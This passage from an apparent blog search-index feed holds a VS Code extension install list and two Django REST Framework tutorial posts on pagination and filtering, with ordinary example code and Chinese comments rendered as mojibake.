johnpapa.angular-essentials</span><br><span class="line">code --install-extension johnpapa.Angular2</span><br><span class="line">code --install-extension johnpapa.vscode-peacock</span><br><span class="line">code --install-extension KevinRose.vsc-python-indent</span><br><span class="line">code --install-extension leizongmin.node-module-intellisense</span><br><span class="line">code --install-extension ms-azuretools.vscode-docker</span><br><span class="line">code --install-extension ms-python.python</span><br><span class="line">code --install-extension ms-vscode.cpptools</span><br><span class="line">code --install-extension ms-vscode.powershell</span><br><span class="line">code --install-extension ms-vscode.vscode-typescript-next</span><br><span class="line">code --install-extension msjsdiag.debugger-for-chrome</span><br><span class="line">code --install-extension mtxr.sqltools</span><br><span class="line">code --install-extension mushan.vscode-paste-image</span><br><span class="line">code --install-extension nickdodd79.gulptasks</span><br><span class="line">code --install-extension nrwl.angular-console</span><br><span class="line">code --install-extension PKief.material-icon-theme</span><br><span class="line">code --install-extension pranaygp.vscode-css-peek</span><br><span class="line">code --install-extension redhat.java</span><br><span class="line">code --install-extension shamanu4.django-intellisense</span><br><span class="line">code --install-extension shd101wyy.markdown-preview-enhanced</span><br><span class="line">code --install-extension sidthesloth.html5-boilerplate</span><br><span class="line">code --install-extension sysoev.language-stylus</span><br><span class="line">code --install-extension tanato.vscode-gulp</span><br><span class="line">code --install-extension thebarkman.vscode-djaneiro</span><br><span class="line">code --install-extension thekalinga.bootstrap4-vscode</span><br><span class="line">code --install-extension VisualStudioExptTeam.vscodeintellicode</span><br><span class="line">code --install-extension vscjava.vscode-java-debug</span><br><span class="line">code --install-extension vscjava.vscode-java-dependency</span><br><span class="line">code --install-extension vscjava.vscode-java-pack</span><br><span class="line">code --install-extension vscjava.vscode-java-test</span><br><span class="line">code --install-extension vscjava.vscode-maven</span><br><span class="line">code --install-extension vscode-icons-team.vscode-icons</span><br><span class="line">code --install-extension waderyan.nodejs-extension-pack</span><br><span class="line">code --install-extension xabikos.JavaScriptSnippets</span><br><span class="line">code --install-extension yzhang.markdown-all-in-one</span><br><span class="line">code --install-extension ZainChen.json</span><br><span class="line">code --install-extension zhuangtongfa.material-theme</span><br><span class="line">code --install-extension zhutian.swig</span><br></pre></td></tr></table></figure><h2 id="Êèí‰ª∂ÂàóË°®ÂØºÂÖ•">Êèí‰ª∂ÂàóË°®ÂØºÂÖ•</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash my_vscode_extensions.sh</span><br></pre></td></tr></table></figure><h1 id="ÂèÇËÄÉÈìæÊé•">ÂèÇËÄÉÈìæÊé•</h1><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vam9zZWx1aXNxLzQ3NDBlMzdhOWYyMzU4MzU3MzgxZTMwOGFhMzljNTJk">How to export your VS Code extensions from terminal<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82NTkxMzMwMA==">ÊàëÁöÑChromeÊµèËßàÂô®ÈÉΩÂÆâË£Ö‰∫ÜÂì™‰∫õÊâ©Â±ïÊèí‰ª∂<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Mac OS </tag>
            
            <tag> Tools </tag>
            
            <tag> Setup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞ÔºàÂçÅ‰∫îÔºâÔºöÂàÜÈ°µÁªÑ‰ª∂</title>
      <link href="/tech/drf-learning-notes-15-pagination/"/>
      <url>/tech/drf-learning-notes-15-pagination/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (15): Pagination</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†Å <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvcGFnaW5hdGlvbi5weQ==">rest_framework.pagination<i class="fa fa-external-link-alt"></i></span></li><li>ÂÆòÊñπÊñáÊ°£ <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcGFnaW5hdGlvbi8=">API Guide - Pagination<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzE1X2RyZl9wYWdpbmF0aW9uLw==">Êú¨Êñádemo‰ª£Á†ÅGithub<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="drfÂàÜÈ°µÁ±ª">DRFÂàÜÈ°µÁ±ª</h1><h2 id="Âü∫Á°ÄÂàÜÈ°µÁ±ª-pagenumberpagination">Âü∫Á°ÄÂàÜÈ°µÁ±ª PageNumberPagination</h2><h3 id="urls.py">urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'cars/'</span>, views.CarListAPIView.as_view()),     <span class="comment"># Âü∫Á°ÄÂàÜÈ°µ</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="views.py">views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.generics <span class="keyword">import</span> ListAPIView</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models, serializers, paginations</span><br><span class="line"></span><br><span class="line"><span class="comment"># Âü∫Á°ÄÂàÜÈ°µ PageNumberPagination</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># Â¶ÇÊûúquerysetÊ≤°ÊúâËøáÊª§Êù°‰ª∂ÔºåÂ∞±ÂøÖÈ°ª .all()Ôºå‰∏çÁÑ∂ÂàÜÈ°µ‰ºöÂá∫ÈóÆÈ¢ò</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ÂàÜÈ°µÁªÑ‰ª∂ - ÁªôËßÜÂõæÁ±ªÈÖçÁΩÆÂàÜÈ°µÁ±ªÂç≥ÂèØ - ÂàÜÈ°µÁ±ªÈúÄË¶ÅËá™ÂÆö‰πâÔºåÁªßÊâødrfÊèê‰æõÁöÑÂàÜÈ°µÁ±ªÂç≥ÂèØ</span></span><br><span class="line">    pagination_class = paginations.MyPageNumberPagination</span><br><span class="line"></span><br><span class="line">    <span class="comment">#eg:/cars/  ÊòæÁ§∫Á¨¨‰∏ÄÈ°µ‰∏âÊù°</span></span><br><span class="line">    <span class="comment">#/cars/?page=2&amp;page_size=4   ÊØèÈ°µÊòæÁ§∫4Êù°ÔºåÊòæÁ§∫Á¨¨‰∫åÈ°µÁöÑ4Êù°</span></span><br></pre></td></tr></table></figure><h2 id="ÂÅèÁßªÂàÜÈ°µÁ±ª-limitoffsetpagination">ÂÅèÁßªÂàÜÈ°µÁ±ª LimitOffsetPagination</h2><h3 id="urls.py-1">urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars1/'</span>, views.CarListAPIView1.as_view()),     <span class="comment"># ÂÅèÁßªÂàÜÈ°µ</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="views.py-1">views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ÂÅèÁßªÂàÜÈ°µ LimitOffsetPagination</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView1</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># Â¶ÇÊûúquerysetÊ≤°ÊúâËøáÊª§Êù°‰ª∂ÔºåÂ∞±ÂøÖÈ°ª .all()Ôºå‰∏çÁÑ∂ÂàÜÈ°µ‰ºöÂá∫ÈóÆÈ¢ò</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ÂàÜÈ°µÁªÑ‰ª∂ - ÁªôËßÜÂõæÁ±ªÈÖçÁΩÆÂàÜÈ°µÁ±ªÂç≥ÂèØ - ÂàÜÈ°µÁ±ªÈúÄË¶ÅËá™ÂÆö‰πâÔºåÁªßÊâødrfÊèê‰æõÁöÑÂàÜÈ°µÁ±ªÂç≥ÂèØ</span></span><br><span class="line">    pagination_class = paginations.MyLimitOffsetPagination</span><br></pre></td></tr></table></figure><h2 id="Ê∏∏Ê†áÂàÜÈ°µÁ±ª-cursorpagination">Ê∏∏Ê†áÂàÜÈ°µÁ±ª CursorPagination</h2><h3 id="urls.py-2">urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars2/'</span>, views.CarListAPIView2.as_view()),   <span class="comment"># Ê∏∏Ê†áÂàÜÈ°µ</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="views.py-2">views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ê∏∏Ê†áÂàÜÈ°µ CursorPagination</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView2</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># Â¶ÇÊûúquerysetÊ≤°ÊúâËøáÊª§Êù°‰ª∂ÔºåÂ∞±ÂøÖÈ°ª .all()Ôºå‰∏çÁÑ∂ÂàÜÈ°µ‰ºöÂá∫ÈóÆÈ¢ò</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ÂàÜÈ°µÁªÑ‰ª∂ - ÁªôËßÜÂõæÁ±ªÈÖçÁΩÆÂàÜÈ°µÁ±ªÂç≥ÂèØ - ÂàÜÈ°µÁ±ªÈúÄË¶ÅËá™ÂÆö‰πâÔºåÁªßÊâødrfÊèê‰æõÁöÑÂàÜÈ°µÁ±ªÂç≥ÂèØ</span></span><br><span class="line">    pagination_class = paginations.MyCursorPagination</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞ÔºàÂçÅÂõõÔºâÔºöËøáÊª§Âô®ÁªÑ‰ª∂</title>
      <link href="/tech/drf-learning-notes-14-filters/"/>
      <url>/tech/drf-learning-notes-14-filters/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (14): Filters</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†Å <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvZmlsdGVycy5weQ==">rest_framework.filters<i class="fa fa-external-link-alt"></i></span></li><li>ÂÆòÊñπÊñáÊ°£<ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmlsdGVyaW5nLw==">DRF API Guide - Filtering<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9kamFuZ28tZmlsdGVyLnJlYWR0aGVkb2NzLmlvL2VuL3N0YWJsZS8=">django-filter<i class="fa fa-external-link-alt"></i></span></li></ul></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzE0X2RyZl9maWx0ZXJzLw==">Êú¨Êñádemo‰ª£Á†ÅGithub<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="drfËøáÊª§ÁªÑ‰ª∂">DRFËøáÊª§ÁªÑ‰ª∂</h1><h2 id="drfÊêúÁ¥¢ËøáÊª§ÁªÑ‰ª∂">DRFÊêúÁ¥¢ËøáÊª§ÁªÑ‰ª∂</h2><h3 id="urls.py">urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars/'</span>, views.CarListAPIView.as_view()),     <span class="comment"># SearchFilter</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="views.py">views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># drfÁöÑSearchFilter</span></span><br><span class="line"><span class="comment"># Á¨¨‰∏ÄÊ≠•Ôºö ÊêúÁ¥¢ËøáÊª§</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> SearchFilter</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer  <span class="comment">#Ëá™ÂÆö‰πâËÆ§ËØÅ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Á¨¨‰∫åÊ≠•ÔºöÂ±ÄÈÉ®ÈÖçÁΩÆ ËøáÊª§Á±ª ‰ª¨ÔºàÂÖ®Â±ÄÈÖçÁΩÆÁî®DEFAULT_FILTER_BACKENDSÔºâ</span></span><br><span class="line">    filter_backends = [SearchFilter]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Á¨¨‰∏âÊ≠•ÔºöSearchFilterËøáÊª§Á±ª‰æùËµñÁöÑËøáÊª§Êù°‰ª∂ =&gt; Êé•Âè£Ôºö/cars/?search=...</span></span><br><span class="line">    search_fields = [<span class="string">'name'</span>, <span class="string">'price'</span>]  <span class="comment">#Á≠õÈÄâÂ≠óÊÆµ</span></span><br><span class="line">    <span class="comment"># egÔºö/cars/?search=1ÔºånameÂíåprice‰∏≠ÂåÖÂê´1ÁöÑÊï∞ÊçÆÈÉΩ‰ºöË¢´Êü•ËØ¢Âá∫</span></span><br></pre></td></tr></table></figure><h2 id="drfÊéíÂ∫èËøáÊª§ÁªÑ‰ª∂">DRFÊéíÂ∫èËøáÊª§ÁªÑ‰ª∂</h2><h3 id="urls.py-1">urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars2/'</span>, views.CarListAPIView2.as_view()),   <span class="comment"># OrderingFilter</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="views.py-1">views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Á¨¨‰∏ÄÊ≠•ÔºödrfÁöÑOrderingFilter - ÊéíÂ∫èËøáÊª§</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> OrderingFilter</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView2</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Á¨¨‰∫åÊ≠•ÔºöÂ±ÄÈÉ®ÈÖçÁΩÆ ËøáÊª§Á±ª ‰ª¨ÔºàÂÖ®Â±ÄÈÖçÁΩÆÁî®DEFAULT_FILTER_BACKENDSÔºâ</span></span><br><span class="line">    filter_backends = [OrderingFilter]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Á¨¨‰∏âÊ≠•ÔºöOrderingFilterËøáÊª§Á±ª‰æùËµñÁöÑËøáÊª§Êù°‰ª∂ =&gt; Êé•Âè£Ôºö/cars/?ordering=...</span></span><br><span class="line">    ordering_fields = [<span class="string">'pk'</span>, <span class="string">'price'</span>]</span><br><span class="line">    <span class="comment"># egÔºö/cars/?ordering=-price,pkÔºåÂÖàÊåâpriceÈôçÂ∫èÔºåÂ¶ÇÊûúÂá∫Áé∞priceÁõ∏ÂêåÔºåÂÜçÊåâpkÂçáÂ∫è</span></span><br></pre></td></tr></table></figure><h1 id="Ëá™ÂÆö‰πâËøáÊª§Âô®">Ëá™ÂÆö‰πâËøáÊª§Âô®</h1><h2 id="urls.py-2">urls.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars3/'</span>, views.CarListAPIView3.as_view()),   <span class="comment"># Ëá™ÂÆö‰πâfitler</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="filters.py">filters.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ëá™ÂÆö‰πâËøáÊª§Âô®ÔºåÊé•Âè£Ôºö?limit=ÊòæÁ§∫ÁöÑÊù°Êï∞</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LimitFilter</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter_queryset</span><span class="params">(self, request, queryset, view)</span>:</span></span><br><span class="line">        <span class="comment"># ÂâçÂè∞Âõ∫ÂÆöÁî® ?limit=... ‰º†ÈÄíËøáÊª§ÂèÇÊï∞</span></span><br><span class="line">        limit = request.query_params.get(<span class="string">'limit'</span>)</span><br><span class="line">        <span class="keyword">if</span> limit:</span><br><span class="line">            limit = int(limit)</span><br><span class="line">            <span class="keyword">return</span> queryset[:limit]</span><br><span class="line">        <span class="keyword">return</span> queryset</span><br></pre></td></tr></table></figure><h2 id="views.py-2">views.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ëá™ÂÆö‰πâfitler</span></span><br><span class="line"><span class="keyword">from</span> .filters <span class="keyword">import</span> LimitFilter</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView3</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># Â¶ÇÊûúquerysetÊ≤°ÊúâËøáÊª§Êù°‰ª∂ÔºåÂ∞±ÂøÖÈ°ª .all()Ôºå‰∏çÁÑ∂ÂàÜÈ°µ‰ºöÂá∫ÈóÆÈ¢ò</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Â±ÄÈÉ®ÈÖçÁΩÆ ËøáÊª§Á±ª ‰ª¨ÔºàÂÖ®Â±ÄÈÖçÁΩÆÁî®DEFAULT_FILTER_BACKENDSÔºâ</span></span><br><span class="line">    filter_backends = [LimitFilter]</span><br></pre></td></tr></table></figure><h1 id="ËøáÊª§Âô®Êèí‰ª∂-django-filter">ËøáÊª§Âô®Êèí‰ª∂ django-filter</h1><h2 id="urls.py-3">urls.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars4/'</span>, views.CarListAPIView4.as_view()),   <span class="comment"># Êèí‰ª∂django-filter</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="filters.py-1">filters.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># django-fitlerÊèí‰ª∂ÔºöËá™ÂÆö‰πâËøáÊª§Â≠óÊÆµ</span></span><br><span class="line"><span class="keyword">from</span> django_filters <span class="keyword">import</span> filters</span><br><span class="line"><span class="keyword">from</span> django_filters.rest_framework.filterset <span class="keyword">import</span> FilterSet</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarFilterSet</span><span class="params">(FilterSet)</span>:</span></span><br><span class="line">    min_price = filters.NumberFilter(field_name=<span class="string">'price'</span>, lookup_expr=<span class="string">'gte'</span>)</span><br><span class="line">    max_price = filters.NumberFilter(field_name=<span class="string">'price'</span>, lookup_expr=<span class="string">'lte'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Car</span><br><span class="line">        fields = [<span class="string">'brand'</span>, <span class="string">'min_price'</span>, <span class="string">'max_price'</span>]</span><br><span class="line">        <span class="comment"># brandÊòØmodel‰∏≠Â≠òÂú®ÁöÑÂ≠óÊÆµÔºå‰∏ÄËà¨ÈÉΩÊòØÂèØ‰ª•Áî®‰∫éÂàÜÁªÑÁöÑÂ≠óÊÆµ</span></span><br><span class="line">        <span class="comment"># min_price„ÄÅmax_priceÊòØËá™ÂÆö‰πâÂ≠óÊÆµÔºåÈúÄË¶ÅËá™Â∑±Ëá™ÂÆö‰πâËøáÊª§Êù°‰ª∂</span></span><br></pre></td></tr></table></figure><h2 id="views.py-3">views.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># django-filterÊèí‰ª∂ËøáÊª§Âô®</span></span><br><span class="line"><span class="keyword">from</span> django_filters.rest_framework <span class="keyword">import</span> DjangoFilterBackend</span><br><span class="line"><span class="keyword">from</span> .filters <span class="keyword">import</span> CarFilterSet</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView4</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Â±ÄÈÉ®ÈÖçÁΩÆ ËøáÊª§Á±ª ‰ª¨ÔºàÂÖ®Â±ÄÈÖçÁΩÆÁî®DEFAULT_FILTER_BACKENDSÔºâ</span></span><br><span class="line">    filter_backends = [DjangoFilterBackend]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># django-filterËøáÊª§Âô®Êèí‰ª∂‰ΩøÁî®</span></span><br><span class="line">    <span class="comment">#filter_class = CarFilterSet</span></span><br><span class="line">    filterset_class = CarFilterSet  <span class="comment"># ÊóßÁâàÂÜô‰Ωúfilter_class, Êñ∞ÁâàÂÜô‰Ωúfitlerset_class</span></span><br><span class="line">    <span class="comment"># Êé•Âè£Ôºö?brand=...&amp;min_price=...&amp;max_price=...</span></span><br><span class="line">    <span class="comment"># eg:?brand=ÂÆùÈ©¨&amp;min_price=5&amp;max_price=10 =&gt; 5~10Èó¥ÁöÑÂÆùÈ©¨ÁâåÊ±ΩËΩ¶</span></span><br></pre></td></tr></table></figure><h1 id="Êâ©Â±ïÈòÖËØª">Êâ©Â±ïÈòÖËØª</h1><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWHVDaGVuZ05vdGVzL3AvMTIwMTk3NzQuaHRtbA==">drf ËøáÊª§Âô®ÁªÑ‰ª∂‰∏éËá™ÂÆö‰πâËøáÊª§Âô®<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞ÔºàÂçÅ‰∏âÔºâÔºöÈ¢ëÁéáÁªÑ‰ª∂</title>
      <link href="/tech/drf-learning-notes-13-throttle/"/>
      <url>/tech/drf-learning-notes-13-throttle/</url>
      
